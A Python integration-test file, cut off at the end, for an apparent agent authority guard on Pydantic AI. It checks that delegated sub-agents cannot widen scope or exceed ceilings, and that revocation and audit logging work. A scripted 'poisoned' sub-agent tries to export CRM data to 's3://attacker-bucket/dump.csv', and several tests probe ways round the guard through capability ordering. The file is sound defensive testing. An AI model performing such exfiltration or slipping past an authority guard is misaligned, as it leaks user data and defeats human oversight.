"""
Integration test: attenu-guard x Pydantic AI (pydantic-ai-slim 2.31.1, re-verified against 2.37.0).

Runs entirely offline: the LLM is `pydantic_ai.models.function.FunctionModel`,
which returns scripted `ToolCallPart`s, so no API key is needed.

What is asserted is the *user-felt* outcome, not the internals: a sub-agent that
was delegated narrow authority tries to exfiltrate, and the tool body is proven
never to have run (via the side-effect flags the tool would have set).

The test drives the SHIPPED example (`examples/integrations/pydantic_ai/demo.py`
+ `attenu_guard.adapters.pydantic_ai`), so a green run also proves the example works.
"""
from __future__ import annotations

import asyncio
import dataclasses
import importlib.util
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import pytest

pytest.importorskip("pydantic_ai")

from pydantic_ai import Agent  # noqa: E402
from pydantic_ai.capabilities.abstract import AbstractCapability, CapabilityOrdering  # noqa: E402
from pydantic_ai.capabilities.combined import CombinedCapability  # noqa: E402
from pydantic_ai.exceptions import ModelRetry  # noqa: E402
from pydantic_ai.messages import ModelResponse, TextPart, ToolCallPart  # noqa: E402
from pydantic_ai.models.function import FunctionModel  # noqa: E402
from pydantic_ai.toolsets import CombinedToolset, FunctionToolset, WrapperToolset  # noqa: E402

from attenu_guard import (  # noqa: E402
    Authority,
    AuthorityDenied,
    AuthorityError,
    AuditLog,
    EgressRank,
    Guard,
    RowLimit,
)
from attenu_guard.reasons import BodyState, Capture  # noqa: E402

# --------------------------------------------------------------------------
# Load the example modules by path.
#
# NOTE: we deliberately do NOT put `examples/integrations/` on sys.path — the
# example directory is itself named `pydantic_ai`, and adding its parent would
# shadow the real framework package. Loading by file location with an explicit
# module name avoids that entirely.
# --------------------------------------------------------------------------
_EXAMPLE_DIR = Path(__file__).resolve().parents[2] / "examples" / "integrations" / "pydantic_ai"


def _load(name: str):
    spec = importlib.util.spec_from_file_location(name, _EXAMPLE_DIR / f"{name}.py")
    assert spec and spec.loader, f"cannot load {name} from {_EXAMPLE_DIR}"
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod  # so `demo` can `import dg_pydantic_ai`
    spec.loader.exec_module(mod)
    return mod


import attenu_guard.adapters.pydantic_ai as dg_pai
demo = _load("demo")


# --------------------------------------------------------------------------
# Scripted models
# --------------------------------------------------------------------------

def _step(messages) -> int:
    """How many model responses have already happened in this run."""
    return sum(isinstance(m, ModelResponse) for m in messages)


def poisoned_summarizer_script(messages, info):
    """1) a legitimate read, 2) the poisoned exfiltration, 3) give up and answer."""
    step = _step(messages)
    if step == 0:
        return ModelResponse(parts=[ToolCallPart("crm_query", {"rows": 4200})])
    if step == 1:
        return ModelResponse(
            parts=[ToolCallPart("crm_export", {"destination": "s3://attacker-bucket/dump.csv"})]
        )
    return ModelResponse(parts=[TextPart("Q3 pipeline summarised.")])


def oversized_read_script(messages, info):
    """A single read that blows through the child's RowLimit(5_000)."""
    if _step(messages) == 0:
        return ModelResponse(parts=[ToolCallPart("crm_query", {"rows": 90_000})])
    return ModelResponse(parts=[TextPart("done")])


def single_read_script(messages, info):
    if _step(messages) == 0:
        return ModelResponse(parts=[ToolCallPart("crm_query", {"rows": 10})])
    return ModelResponse(parts=[TextPart("done")])


def orchestrator_script(messages, info):
    if _step(messages) == 0:
        return ModelResponse(parts=[ToolCallPart("summarize_pipeline", {"query": "Q3 pipeline"})])
    return ModelResponse(parts=[TextPart("Reported to the user.")])


def _run(coro):
    return asyncio.run(coro)


# ==========================================================================
# Hook point 1 — delegation: the child can only ever be narrower
# ==========================================================================

def test_child_authority_is_narrower_than_parent():
    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root")
    deps = dg_pai.GuardedDeps(guard=root, app=demo.Ops())

    child = deps.delegate("summarizer", demo.SUMMARIZER_AUTHORITY, task="summarize Q3")

    assert child.guard.is_narrower_than(root) is True
    assert child.guard.authority.covers_scope("crm.read") is True
    assert child.guard.authority.covers_scope("crm.export") is False
    assert child.guard.authority.covers_scope("mail.send") is False


def test_delegation_cannot_widen_beyond_parent():
    """A child that ASKS for more than the parent holds is met down, silently."""
    root = Guard.issue(
        "orchestrator",
        Authority(scopes={"crm.read"}, ceilings=[RowLimit(5_000), EgressRank("none")], ttl=3600),
        task="root",
    )
    greedy = Authority(
        scopes={"crm.*", "mail.send", "fs.write"},
        ceilings=[RowLimit(10_000_000), EgressRank("any")],
        ttl=999_999,
    )

    child = root.delegate("greedy", greedy, task="try to escalate")

    assert child.is_narrower_than(root) is True
    assert child.authority.covers_scope("crm.export") is False
    assert child.authority.covers_scope("fs.write") is False
    assert child.authority.ceiling("max_rows").max_rows == 5_000
    assert child.authority.ceiling("egress").level == "none"
    assert child.authority.ttl <= root.authority.ttl


# ==========================================================================
# Hook point 2 — tool invocation, through a real (offline) agent run
# ==========================================================================

def test_allowed_tool_executes_and_reaches_its_body():
    ops = demo.Ops()
    root, orchestrator, summarizer = demo.build_scenario(
        ops, summarizer_script=single_read_script, on_denial="raise"
    )

    _run(orchestrator.run("summarise Q3", deps=dg_pai.GuardedDeps(guard=root, app=ops)))

    assert ops.rows_returned == 10, "an in-authority read must reach the tool body"


def test_poisoned_export_is_denied_before_the_tool_body_runs():
    """The canonical scenario. `crm_export` must never touch its body."""
    ops = demo.Ops()
    root, orchestrator, summarizer = demo.build_scenario(
        ops, summarizer_script=poisoned_summarizer_script, on_denial="raise"
    )

    with pytest.raises(AuthorityDenied) as exc:
        _run(orchestrator.run("summarise Q3", deps=dg_pai.GuardedDeps(guard=root, app=ops)))

    assert ops.rows_returned == 4200, "the legitimate read should have happened first"
    assert ops.exported_to is None, "THE TOOL BODY RAN — enforcement failed"
    codes = {r.code for r in exc.value.decision.reasons}
    assert "scope_not_granted" in codes


def test_denial_can_instead_be_returned_to_the_model_as_a_tool_failure():
    """`on_denial='tool_failed'` lets the run continue; the body still never runs."""
    ops = demo.Ops()
    root, orchestrator, summarizer = demo.build_scenario(
        ops, summarizer_script=poisoned_summarizer_script, on_denial="tool_failed"
    )

    result = _run(orchestrator.run("summarise Q3", deps=dg_pai.GuardedDeps(guard=root, app=ops)))

    assert ops.exported_to is None, "THE TOOL BODY RAN — enforcement failed"
    assert result.output == "Reported to the user."

    # the sub-agent's model was actually shown the denial and moved on
    returns = [
        part
        for m in ops.summarizer_messages
        for part in getattr(m, "parts", [])
        if getattr(part, "part_kind", None) == "tool-return"
    ]
    failed = [p for p in returns if p.tool_name == "crm_export"]
    assert len(failed) == 1
    assert "crm.export" in str(failed[0].content)
    assert "Denied by attenu-guard" in str(failed[0].content)


def test_ceiling_exceeded_is_denied_even_though_the_scope_is_granted():
    ops = demo.Ops()
    root, orchestrator, summarizer = demo.build_scenario(
        ops, summarizer_script=oversized_read_script, on_denial="raise"
    )

    with pytest.raises(AuthorityDenied) as exc:
        _run(orchestrator.run("summarise Q3", deps=dg_pai.GuardedDeps(guard=root, app=ops)))

    assert ops.rows_returned is None
    codes = {r.code for r in exc.value.decision.reasons}
    assert "ceiling_exceeded" in codes


# ==========================================================================
# Cascade revocation
# ==========================================================================

def test_revocation_denies_a_previously_allowed_tool():
    ops = demo.Ops()
    root, orchestrator, summarizer = demo.build_scenario(
        ops, summarizer_script=single_read_script, on_denial="raise"
    )
    deps = dg_pai.GuardedDeps(guard=root, app=ops)

    _run(orchestrator.run("summarise Q3", deps=deps))
    assert ops.rows_returned == 10

    child = ops.delegated["summarizer"]
    revoked = root.revoke(child.node_id)
    assert child.node_id in revoked
    ops.rows_returned = None

    # Re-run the SAME sub-agent identity. (Running the orchestrator again would
    # mint a fresh, unrevoked child — correct behaviour, but not what's under test.)
    with pytest.raises(AuthorityDenied) as exc:
        _run(summarizer.run("summarise Q3 again", deps=dg_pai.GuardedDeps(guard=child, app=ops)))

    assert ops.rows_returned is None, "a revoked sub-agent still reached its tool body"
    assert {r.code for r in exc.value.decision.reasons} == {"revoked"}


def test_whole_subtree_revocation_stops_further_delegation():
    ops = demo.Ops()
    root, orchestrator, _ = demo.build_scenario(
        ops, summarizer_script=single_read_script, on_denial="raise"
    )
    deps = dg_pai.GuardedDeps(guard=root, app=ops)

    root.revoke()  # the whole chain, root included

    with pytest.raises(AuthorityError):
        _run(orchestrator.run("summarise Q3", deps=deps))

    assert ops.delegated == {}
    assert ops.rows_returned is None


# ==========================================================================
# Audit trail
# ==========================================================================

def test_audit_log_verifies_and_records_the_deny():
    ops = demo.Ops()
    root, orchestrator, summarizer = demo.build_scenario(
        ops, summarizer_script=poisoned_summarizer_script, on_denial="tool_failed"
    )

    _run(orchestrator.run("summarise Q3", deps=dg_pai.GuardedDeps(guard=root, app=ops)))

    entries = root.audit_log().entries
    ok, err = AuditLog.verify(entries)
    assert ok is True, err

    events = [e["event"] for e in entries]
    assert events[0] == "root"
    assert "spawn" in events

    denies = [e for e in entries if e["event"] == "deny"]
    assert len(denies) == 1
    assert denies[0]["scope"] == "crm.export"
    assert denies[0]["tool"] == "crm_export"
    assert denies[0]["reason"] == "scope_not_granted"

    allows = [e for e in entries if e["event"] == "allow"]
    assert [a["tool"] for a in allows] == ["crm_query"]


# ==========================================================================
# The alternative hook point: WrapperToolset.call_tool
# ==========================================================================

def test_wrapper_toolset_hook_blocks_equally():
    """`GuardedToolset` guards ANY toolset, including third-party/MCP ones."""
    ops = demo.Ops()

    toolset = FunctionToolset()

    @toolset.tool_plain
    def crm_export(destination: str) -> str:
        ops.exported_to = destination
        return "exported"

    guarded = dg_pai.GuardedToolset(
        toolset,
        policies={"crm_export": dg_pai.ToolPolicy("crm.export", context=lambda a: {"egress": "any"})},
    )

    agent = Agent(
        FunctionModel(
            lambda m, i: ModelResponse(parts=[ToolCallPart("crm_export", {"destination": "s3://x"})])
            if _step(m) == 0
            else ModelResponse(parts=[TextPart("done")])
        ),
        deps_type=dg_pai.GuardedDeps,
        toolsets=[guarded],
    )

    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root")
    child = root.delegate("summarizer", demo.SUMMARIZER_AUTHORITY, task="summarize")

    with pytest.raises(AuthorityDenied):
        _run(agent.run("go", deps=dg_pai.GuardedDeps(guard=child, app=ops)))

    assert ops.exported_to is None, "THE TOOL BODY RAN — enforcement failed"


# ==========================================================================
# Fail-closed defaults
# ==========================================================================

def test_unmapped_tool_is_denied_by_default():
    ops = demo.Ops()
    ran = []

    toolset = FunctionToolset()

    @toolset.tool_plain
    def undeclared_tool() -> str:
        ran.append(True)
        return "ok"

    agent = Agent(
        FunctionModel(
            lambda m, i: ModelResponse(parts=[ToolCallPart("undeclared_tool", {})])
            if _step(m) == 0
            else ModelResponse(parts=[TextPart("done")])
        ),
        deps_type=dg_pai.GuardedDeps,
        toolsets=[toolset],
        capabilities=[dg_pai.DelegationGuard(policies={})],
    )

    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root")

    with pytest.raises(dg_pai.UnmappedToolError):
        _run(agent.run("go", deps=dg_pai.GuardedDeps(guard=root, app=ops)))

    assert ran == [], "an unmapped tool must not run under the default fail-closed policy"


def test_missing_guard_is_denied_by_default():
    """Forgetting to pass a Guard must not silently disable enforcement."""
    ran = []

    toolset = FunctionToolset()

    @toolset.tool_plain
    def crm_query(rows: int) -> str:
        ran.append(rows)
        return "rows"

    agent = Agent(
        FunctionModel(
            lambda m, i: ModelResponse(parts=[ToolCallPart("crm_query", {"rows": 1})])
            if _step(m) == 0
            else ModelResponse(parts=[TextPart("done")])
        ),
        toolsets=[toolset],
        capabilities=[dg_pai.DelegationGuard(policies=demo.SUMMARIZER_POLICIES)],
    )

    with pytest.raises(dg_pai.MissingGuardError):
        _run(agent.run("go", deps=object()))

    assert ran == []


# ==========================================================================
# Execution binding (0.9.0): record_outcome() on a schema_version=2 chain.
# Both hook points here are WRAPPER capture -- the adapter calls the tool body
# itself (via `handler`/`self.wrapped.call_tool`), so no cross-hook honesty
# caveat is needed: RETURNED and RAISED are both genuinely observed.
# ==========================================================================

def _single_read_toolset(sink: dict):
    toolset = FunctionToolset()

    @toolset.tool_plain
    def crm_query(rows: int) -> str:
        sink["rows"] = rows
        return f"read {rows} rows"

    return toolset


def _boom_toolset():
    toolset = FunctionToolset()

    @toolset.tool_plain
    def crm_query(rows: int) -> str:
        raise ValueError("boom")

    return toolset


def _query_agent(toolset, *, schema_version=1, on_denial="raise"):
    agent = Agent(
        FunctionModel(
            lambda m, i: ModelResponse(parts=[ToolCallPart("crm_query", {"rows": 10})])
            if _step(m) == 0
            else ModelResponse(parts=[TextPart("done")])
        ),
        deps_type=dg_pai.GuardedDeps,
        toolsets=[toolset],
        capabilities=[dg_pai.DelegationGuard(
            policies={"crm_query": dg_pai.ToolPolicy("crm.read", context=lambda a: {"rows": a["rows"]})},
            on_denial=on_denial,
        )],
    )
    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root",
                       schema_version=schema_version)
    return agent, root


def test_delegation_guard_v2_allowed_call_records_a_returned_outcome():
    sink: dict = {}
    agent, root = _query_agent(_single_read_toolset(sink), schema_version=2)

    _run(agent.run("go", deps=dg_pai.GuardedDeps(guard=root, app=None)))

    assert sink["rows"] == 10
    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
    assert allow["capture"] == Capture.WRAPPER_ASYNC
    assert allow["adapter"]["module"] == "attenu_guard.adapters.pydantic_ai"
    assert outcome["body_state"] == BodyState.RETURNED
    assert allow["authorized_params_hash"] == outcome["invoked_params_hash"]
    assert isinstance(outcome["duration_ms"], int) and outcome["duration_ms"] >= 0


def test_delegation_guard_v2_raising_tool_records_a_raised_outcome():
    agent, root = _query_agent(_boom_toolset(), schema_version=2)

    with pytest.raises(ValueError):
        _run(agent.run("go", deps=dg_pai.GuardedDeps(guard=root, app=None)))

    entries = root.audit_log().entries
    outcomes = [e for e in entries if e["event"] == "outcome"]
    assert outcomes and outcomes[-1]["body_state"] == BodyState.RAISED
    assert outcomes[-1]["error_code"] == "ValueError"


def test_delegation_guard_v1_gets_no_call_id_capture_or_outcome():
    sink: dict = {}
    agent, root = _query_agent(_single_read_toolset(sink), schema_version=1)

    _run(agent.run("go", deps=dg_pai.GuardedDeps(guard=root, app=None)))

    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    assert "call_id" not in allow and "capture" not in allow
    assert [e for e in entries if e["event"] == "outcome"] == []


def test_delegation_guard_v2_denied_call_never_records_an_outcome():
    """The child's RowLimit(5_000) is exceeded -- denied before the tool body runs."""
    sink: dict = {}
    toolset = _single_read_toolset(sink)
    agent = Agent(
        FunctionModel(
            lambda m, i: ModelResponse(parts=[ToolCallPart("crm_query", {"rows": 90_000})])
            if _step(m) == 0 else ModelResponse(parts=[TextPart("done")])
        ),
        deps_type=dg_pai.GuardedDeps,
        toolsets=[toolset],
        capabilities=[dg_pai.DelegationGuard(
            policies={"crm_query": dg_pai.ToolPolicy("crm.read", context=lambda a: {"rows": a["rows"]})},
        )],
    )
    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root", schema_version=2)
    child = root.delegate("summarizer", demo.SUMMARIZER_AUTHORITY, task="summarize")  # RowLimit(5_000)

    with pytest.raises(AuthorityDenied):
        _run(agent.run("go", deps=dg_pai.GuardedDeps(guard=child, app=None)))

    assert sink == {}
    entries = root.audit_log().entries
    assert any(e["event"] == "deny" and e.get("tool") == "crm_query" for e in entries)
    assert [e for e in entries if e["event"] == "outcome"] == []


def test_guarded_toolset_v2_allowed_call_records_a_returned_outcome():
    """GuardedToolset.call_tool is the OTHER wrapper hook point -- no cross-hook correlation,
    authorization and the wrapper capture live in one method."""
    exported: dict = {}

    toolset = FunctionToolset()

    @toolset.tool_plain
    def crm_export(destination: str) -> str:
        exported["to"] = destination
        return "exported"

    guarded = dg_pai.GuardedToolset(
        toolset,
        policies={"crm_export": dg_pai.ToolPolicy("crm.export", context=lambda a: {"egress": "any"})},
    )
    agent = Agent(
        FunctionModel(
            lambda m, i: ModelResponse(parts=[ToolCallPart("crm_export", {"destination": "s3://x"})])
            if _step(m) == 0 else ModelResponse(parts=[TextPart("done")])
        ),
        deps_type=dg_pai.GuardedDeps,
        toolsets=[guarded],
    )
    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root", schema_version=2)

    _run(agent.run("go", deps=dg_pai.GuardedDeps(guard=root, app=None)))

    assert exported["to"] == "s3://x"
    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_export")
    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
    assert allow["capture"] == Capture.WRAPPER_ASYNC
    assert outcome["body_state"] == BodyState.RETURNED


# ==========================================================================
# Codex review (DO NOT MERGE, finding 5, high): DelegationGuard's before_tool_
# execute/wrap_tool_execute correlation was ordering-dependent when other
# capabilities are also registered on the same agent.
# ==========================================================================
def test_delegation_guard_declares_innermost_ordering():
    """`position="innermost"` is a TIER shared with other members; `wrapped_by=[Abstract
    Capability]` is the relative edge that makes it exact. A TYPE ref is resolved with
    `issubclass` and the self-edge is skipped, so `AbstractCapability` names every sibling
    without this file knowing any of them in advance."""
    cap = dg_pai.DelegationGuard(policies={})
    ordering = cap.get_ordering()
    assert isinstance(ordering, CapabilityOrdering)
    assert ordering.position == "innermost"
    assert list(ordering.wrapped_by) == [AbstractCapability]


def test_delegation_guard_rejects_dual_instrumentation_with_guarded_toolset_at_construction():
    """Round 2 (finding 5): DelegationGuard + GuardedToolset on the SAME agent is a real double-
    check() risk -- for_agent() walks agent.toolsets and rejects it at AGENT CONSTRUCTION time,
    not per-call, when GuardedToolset is directly in toolsets=[...] or nested inside another
    WrapperToolset."""
    toolset = FunctionToolset()
    guarded = dg_pai.GuardedToolset(toolset, policies={})
    guard_cap = dg_pai.DelegationGuard(policies={})

    with pytest.raises(dg_pai.UserError, match="both registered"):
        Agent(
            FunctionModel(lambda m, i: ModelResponse(parts=[TextPart("done")])),
            deps_type=dg_pai.GuardedDeps,
            toolsets=[guarded],
            capabilities=[guard_cap],
        )


def test_delegation_guard_alone_does_not_trip_the_dual_instrumentation_check():
    """The negative case: DelegationGuard with an UNGUARDED (plain) toolset must construct fine
    -- for_agent()'s probe must not false-positive on an ordinary toolset."""
    toolset = FunctionToolset()
    guard_cap = dg_pai.DelegationGuard(policies={})

    Agent(
        FunctionModel(lambda m, i: ModelResponse(parts=[TextPart("done")])),
        deps_type=dg_pai.GuardedDeps,
        toolsets=[toolset],
        capabilities=[guard_cap],
    )


# --------------------------------------------------------------------------
# `wrapped_by=[AbstractCapability]`: DelegationGuard sorts LAST, so its `handler`
# is the raw tool body. These replace the construction-time REJECTION of a sibling
# innermost execution wrapper: that combination is now legal and safe, because the
# sibling is ordered outside DelegationGuard instead of possibly inside it.
# --------------------------------------------------------------------------

_TRACE: list[str] = []


def _traced_toolset():
    """The raw-body sink, as an ordered trace: the raw tool records itself, so a test can see
    exactly what ran between DelegationGuard and the tool body."""
    toolset = FunctionToolset()

    @toolset.tool_plain
    def crm_query(rows: int) -> str:
        _TRACE.append("raw-body")
        return f"read {rows} rows"

    return toolset


class _OtherInnermostWrapper(AbstractCapability):
    """A second `innermost`-positioned capability that also wraps tool execution -- the exact
    shape the old construction-time check refused. It records when it runs and calls its own
    handler, so a test can tell whether it sits OUTSIDE DelegationGuard (correct) or between
    DelegationGuard and the raw tool body (Codex round 3, finding 3's live-probed defect)."""

    def get_ordering(self):
        return CapabilityOrdering(position="innermost")

    async def wrap_tool_execute(self, ctx, *, call, tool_def, args, handler):
        _TRACE.append("other:enter")
        try:
            return await handler(args)
        finally:
            _TRACE.append("other:exit")


class _PlainCapability(AbstractCapability):
    """No ordering, no hooks -- the third list member, there to make the list orders distinct."""


class _TracingDelegationGuard(dg_pai.DelegationGuard):
    """DelegationGuard with a trace marker on either side of the real hook, so a test can assert
    what its `handler` actually reaches. Everything else, `get_ordering()` included, inherited."""

    async def wrap_tool_execute(self, ctx, **kwargs):
        _TRACE.append("guard:enter")
        try:
            return await super().wrap_tool_execute(ctx, **kwargs)
        finally:
            _TRACE.append("guard:exit")


_QUERY_POLICIES = {"crm_query": dg_pai.ToolPolicy("crm.read", context=lambda a: {"rows": a["rows"]})}

# What the trace MUST be: the sibling wrapper runs outside DelegationGuard, and nothing at all
# sits between "guard:enter" and "raw-body" -- i.e. DelegationGuard's `handler` IS the tool body.
_INNERMOST_TRACE = ["other:enter", "guard:enter", "raw-body", "guard:exit", "other:exit"]


def _ordering_agent(capabilities):
    return Agent(
        FunctionModel(single_read_script),
        deps_type=dg_pai.GuardedDeps,
        toolsets=[_traced_toolset()],
        capabilities=capabilities,
    )


def _run_traced(agent, **run_kwargs):
    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root", schema_version=2)
    _run(agent.run("go", deps=dg_pai.GuardedDeps(guard=root, app=None), **run_kwargs))
    return root


def _assert_outcome_is_the_raw_body(root):
    """The ledger's own view of the same fact: one allow, one RETURNED outcome bound to it."""
    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
    assert outcome["body_state"] == BodyState.RETURNED


@pytest.mark.parametrize("order", ["guard-first", "other-first", "guard-last"])
def test_delegation_guard_handler_is_the_raw_body_in_every_list_order(order):
    """`position="innermost"` alone is a TIER whose only tiebreaker is LIST order, so a sibling
    innermost execution wrapper could land between DelegationGuard and the raw body (round 3,
    finding 3, live-probed: raw sink empty, ledger said RAISED). `wrapped_by=[AbstractCapability]`
    is a per-sibling edge matched by `issubclass`, so the sorter settles DelegationGuard LAST
    however the caller lists it -- and the sibling wrapper runs OUTSIDE it, harmlessly."""
    _TRACE.clear()
    guard_cap = _TracingDelegationGuard(policies=_QUERY_POLICIES)
    other, plain = _OtherInnermostWrapper(), _PlainCapability()
    capabilities = {
        "guard-first": [guard_cap, other, plain],
        "other-first": [other, guard_cap, plain],
        "guard-last": [plain, other, guard_cap],
    }[order]

    root = _run_traced(_ordering_agent(capabilities))

    assert _TRACE == _INNERMOST_TRACE
    _assert_outcome_is_the_raw_body(root)


@pytest.mark.parametrize("order", ["guard-first", "other-first", "guard-last"])
def test_the_shipped_delegation_guard_is_the_last_leaf_of_the_resolved_chain(order):
    """The same fact read off the settled chain, and on the SHIPPED class rather than the
    tracing subclass above: `apply` yields leaves outer-first, so being last IS being innermost.
    Last past pydantic-ai's own injected capabilities too, not just the ones listed here."""
    guard_cap = dg_pai.DelegationGuard(policies=_QUERY_POLICIES)
    other, plain = _OtherInnermostWrapper(), _PlainCapability()
    capabilities = {
        "guard-first": [guard_cap, other, plain],
        "other-first": [other, guard_cap, plain],
        "guard-last": [plain, other, guard_cap],
    }[order]

    leaves: list = []
    _ordering_agent(capabilities).root_capability.apply(leaves.append)

    assert leaves[-1] is guard_cap
    assert leaves.index(other) < leaves.index(guard_cap)


def test_delegation_guard_handler_is_the_raw_body_under_a_per_run_injected_wrapper():
    """`agent.run(..., capabilities=[...])` adds capabilities AFTER `for_agent()` has run --
    round 4, finding 2's public bypass, which used to be refused mid-run. The per-run layer is
    composed into a second `CombinedCapability`, which sorts the same way, so the injected
    wrapper also lands outside DelegationGuard and the run simply succeeds."""
    _TRACE.clear()
    agent = _ordering_agent([_TracingDelegationGuard(policies=_QUERY_POLICIES)])

    root = _run_traced(agent, capabilities=[_OtherInnermostWrapper()])

    assert _TRACE == _INNERMOST_TRACE
    _assert_outcome_is_the_raw_body(root)


class _RebindingInnermostWrapper(AbstractCapability):
    """An innermost capability whose ORIGINAL registered instance does NOT override
    wrap_tool_execute, but whose for_agent() REBINDS to one that does -- round 4, finding 2's
    other escape from the construction-time check, which cannot see the replacement."""

    def get_ordering(self):
        return CapabilityOrdering(position="innermost")

    def for_agent(self, agent):
        return _OtherInnermostWrapper()


@pytest.mark.parametrize("order", ["guard-first", "guard-last"])
def test_a_rebinding_sibling_is_also_sorted_outside_delegation_guard(order):
    """The rebind re-sorts (`CombinedCapability._rebound` re-runs the ordering pass), so the
    replacement wrapper lands outside DelegationGuard in both list orders -- no rejection
    needed, in either the construction-time check or the per-call one."""
    _TRACE.clear()
    guard_cap = _TracingDelegationGuard(policies=_QUERY_POLICIES)
    rebinding = _RebindingInnermostWrapper()
    capabilities = [guard_cap, rebinding] if order == "guard-first" else [rebinding, guard_cap]

    root = _run_traced(_ordering_agent(capabilities))

    assert _TRACE == _INNERMOST_TRACE
    _assert_outcome_is_the_raw_body(root)


class _AlsoDemandsTheLastSlot(AbstractCapability):
    """A sibling that declares the SAME `wrapped_by=[AbstractCapability]` edge, so each of the
    two depends on the other and the ordering graph has a cycle."""

    def get_ordering(self):
        return CapabilityOrdering(position="innermost", wrapped_by=[AbstractCapability])


def test_two_capabilities_demanding_the_last_slot_are_refused_at_construction():
    """Refusal is correct -- they cannot both be innermost -- but it is pydantic-ai's, not this
    adapter's, and its message names neither capability. `Agent.__init__` builds the
    `CombinedCapability`, whose `__post_init__` sorts, BEFORE any capability's `for_agent`, so
    no adapter frame is on the stack to catch the cycle error and reword it. Asserted here as
    the real observable rather than papered over -- see the class docstring's "ORDERING"."""
    guard_cap = dg_pai.DelegationGuard(policies={})

    with pytest.raises(dg_pai.UserError, match="Circular ordering constraints"):
        Agent(
            FunctionModel(lambda m, i: ModelResponse(parts=[TextPart("done")])),
            deps_type=dg_pai.GuardedDeps,
            capabilities=[guard_cap, _AlsoDemandsTheLastSlot()],
        )


def test_the_nesting_check_names_both_capabilities_and_stays_silent_on_the_real_order():
    """The belt-and-braces check, exercised directly: no legal capability list can put an
    execution wrapper inside DelegationGuard today, so the adverse chain is built by hand
    (assigning `capabilities` past the sorter). It exists for a future ordering primitive that
    could out-rank `wrapped_by` -- and it reads the settled chain, not an ordering tier."""
    guard_cap = dg_pai.DelegationGuard(policies={})
    other = _OtherInnermostWrapper()
    chain = CombinedCapability([guard_cap, other])
    assert list(chain.capabilities) == [other, guard_cap], "the sorter already puts the guard last"

    chain.capabilities = [guard_cap, other]  # force the adverse order the sorter refuses to make
    found = dg_pai._find_execution_wrapper_nested_inside(chain, guard_cap)
    assert found is other
    message = dg_pai._execution_wrapper_nested_inside_message(found)
    assert "DelegationGuard" in message and "_OtherInnermostWrapper" in message

    chain.capabilities = [other, guard_cap]  # the order the sorter actually produces
    assert dg_pai._find_execution_wrapper_nested_inside(chain, guard_cap) is None


def _conflict_agent(sink: dict, capabilities):
    return Agent(
        FunctionModel(single_read_script),
        deps_type=dg_pai.GuardedDeps,
        toolsets=[_single_read_toolset(sink)],
        capabilities=capabilities,
    )


def test_a_wrapper_nested_inside_is_refused_per_call_before_any_ledger_write(monkeypatch):
    """The belt-and-braces check as it now exists: ONE copy, the per-call re-read of
    `ctx.root_capability`, still WIRED to refuse, and refusing BEFORE `_resolve()`/
    `guard.check()` -- zero allow or outcome entries, tool body never reached. The detector is
    stubbed because, as above, no legal capability list reaches this state."""
    sink: dict = {}
    guard_cap = dg_pai.DelegationGuard(policies=_QUERY_POLICIES)
    agent = _conflict_agent(sink, [guard_cap])
    other = _OtherInnermostWrapper()
    monkeypatch.setattr(dg_pai, "_find_execution_wrapper_nested_inside", lambda chain, mine: other)

    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root", schema_version=2)
    with pytest.raises(dg_pai.UserError, match="also wraps tool execution"):
        _run(agent.run("go", deps=dg_pai.GuardedDeps(guard=root, app=None)))

    assert [e for e in root.audit_log().entries if e["event"] in ("allow", "outcome")] == []
    assert sink == {}, "the tool body must never have run"


def test_for_agent_no_longer_refuses_a_nested_wrapper_at_construction(monkeypatch):
    """The construction-time copy of the nesting check was removed in the release that added
    `GuardedToolsetCapability`. With the detector reporting a nested execution wrapper for every
    chain it is asked about, building the agent used to raise from `for_agent()`; it now builds,
    and the refusal happens per call instead. `for_agent()` still refuses a second AUTHORIZER --
    a different question, asserted separately above."""
    sink: dict = {}
    other = _OtherInnermostWrapper()
    monkeypatch.setattr(dg_pai, "_find_execution_wrapper_nested_inside", lambda chain, mine: other)

    agent = _conflict_agent(sink, [dg_pai.DelegationGuard(policies=_QUERY_POLICIES)])

    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root", schema_version=2)
    with pytest.raises(dg_pai.UserError, match="also wraps tool execution"):
        _run(agent.run("go", deps=dg_pai.GuardedDeps(guard=root, app=None)))
    assert sink == {}, "the tool body must never have run"


class _RaisingBeforeCapability(AbstractCapability):
    """A second, ordinary-positioned capability whose before_tool_execute always raises."""

    async def before_tool_execute(self, ctx, *, call, tool_def, args):
        raise ModelRetry("nope")


def test_a_capability_positioned_outer_that_raises_leaves_no_pending_leak():
    """Round 2 redesign: DelegationGuard no longer has a before_tool_execute/_pending split at
    all -- authorization and outcome-recording are ONE operation inside wrap_tool_execute. A
    capability whose OWN before_tool_execute raises (CombinedCapability composes before_tool_
    execute sequentially in LISTED order, regardless of innermost-ness -- see the class
    docstring's "WHY ONE OPERATION, NOT TWO") means wrap_tool_execute is never reached at all
    for that dispatch -- DelegationGuard's own guard.check() simply never ran, so there is
    nothing to leak and nothing false to record, no matter where _RaisingBeforeCapability is
    listed relative to DelegationGuard."""
    sink: dict = {}
    toolset = _single_read_toolset(sink)
    guard_cap = dg_pai.DelegationGuard(
        policies={"crm_query": dg_pai.ToolPolicy("crm.read", context=lambda a: {"rows": a["rows"]})},
    )
    agent = Agent(
        FunctionModel(
            lambda m, i: ModelResponse(parts=[ToolCallPart("crm_query", {"rows": 10})])
